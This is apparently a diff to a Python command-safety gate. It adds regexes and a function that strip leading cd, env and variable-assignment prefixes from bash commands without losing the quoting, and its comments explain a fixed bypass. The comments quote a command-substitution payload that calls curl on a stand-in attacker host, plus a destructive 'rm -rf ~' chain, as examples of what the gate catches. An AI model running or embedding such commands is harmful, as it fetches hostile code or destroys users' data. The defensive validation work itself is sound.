@@ -118,3 +118,70 @@ def stripped_command(bash_command: str) -> str:
     ``compass-ops dismiss``, which a two-token head cannot express.
     """
     return " ".join(strip_command_prefixes(bash_command))
+
+
+# 2026-08-19 (Aletheia F114). A caller that must run a QUOTE-AWARE check on what
+# is left after the prefixes cannot use stripped_command(): that re-joins shlex
+# tokens, which drops the quoting. A semicolon inside an evidence string comes
+# back out naked, so a chain-shape check on the re-joined text would reject a
+# perfectly legitimate remedy.
+#
+# So this returns the ORIGINAL TEXT with only the leading prefixes removed,
+# byte-for-byte from the first real token onward.
+# 2026-08-19, SECOND PASS. The first version of the cd pattern accepted any
+# non-space run as the directory, and a quoted directory as any characters at
+# all. That is weaker than the bespoke _CD_PREFIX_RE it was meant to replace,
+# whose comment records it as the tactical block on an actual exploit -- and I
+# only found out by testing the two against each other instead of assuming the
+# shared one was the better one because it was the shared one.
+#
+#     cd "$(curl attacker.example)" && divineos correction "x"
+#
+# The first version stripped that whole prefix as benign, handed a clean remedy
+# to the chain check, and the gate returned SAFE. The substitution never got
+# looked at because it had already been thrown away.
+#
+# So the directory may not contain a substitution or a chain operator, in either
+# the quoted or the unquoted form. Same exclusions as _CD_PREFIX_RE.
+_CD_RAW_RE = re.compile(r"""^\s*cd\s+(?:["'][^"'$`]+["']|[^\s;&|`$]+)\s*&&\s*""")
+_ENV_RAW_RE = re.compile(r"^\s*env\s+")
+_ASSIGN_RAW_RE = re.compile(
+    r"""^\s*[A-Za-z_][A-Za-z0-9_]*=(?:"[^"$`]*"|'[^'$`]*'|[^\s;&|`$]*)\s+"""
+)
+
+CD = "cd"
+ENV = "env"
+ASSIGN = "assign"
+_RAW_PREFIX_PATTERNS = {CD: _CD_RAW_RE, ENV: _ENV_RAW_RE, ASSIGN: _ASSIGN_RAW_RE}
+ALL_PREFIX_KINDS = (CD, ENV, ASSIGN)
+
+
+def strip_prefixes_raw(bash_command: str, kinds: tuple[str, ...] = ALL_PREFIX_KINDS) -> str:
+    """The command with leading ``cd <path> &&`` / ``env`` / ``NAME=value``
+    removed and everything after preserved verbatim.
+
+    Use this when the remainder still has to be inspected AS SHELL TEXT --
+    quote-aware chain detection, for instance. Use stripped_command() when the
+    remainder only needs comparing token-wise.
+
+    Removing the ``cd ... &&`` prefix does not weaken a chain check applied to
+    the result: what gets removed is provably just a directory change, and any
+    OTHER chain operator survives into the returned string. So
+    ``cd X && divineos correction "y" && rm -rf ~`` still returns text
+    containing ``&& rm -rf ~`` and is still caught.
+    """
+    if not bash_command:
+        return ""
+    text = bash_command
+    changed = True
+    while changed:
+        changed = False
+        for kind in kinds:
+            pattern = _RAW_PREFIX_PATTERNS.get(kind)
+            if pattern is None:
+                continue
+            new_text = pattern.sub("", text, count=1)
+            if new_text != text:
+                text = new_text
+                changed = True
+    return text.strip()
